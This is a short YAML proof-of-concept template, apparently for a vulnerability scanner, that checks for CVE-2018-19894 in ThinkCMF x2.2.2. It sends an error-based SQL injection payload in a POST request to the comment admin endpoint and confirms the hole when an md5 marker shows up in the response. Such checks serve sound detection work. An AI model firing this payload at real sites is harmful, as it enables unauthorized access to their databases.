name: poc-yaml-thinkcmf-cve-2018-19894-sqli
set:
  rand: randomInt(800000000, 1000000000)
rules:
  - method: POST
    path: /index.php?g=Comment&m=commentadmin&a=check&check=1
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: >-
      ids%5B%5D=1&ids%5B%5D=2+and+extractvalue(1%2cconcat_ws(1%2c1%2cmd5({{rand}})))
    expression: |
      response.status == 404 && response.body.bcontains(bytes(md5(string(rand))))

detail:
  author: jweny(https://github.com/jweny)
  ThinkCMF: x2.2.2
  links:
    - https://github.com/thinkcmf/cmfx/issues/26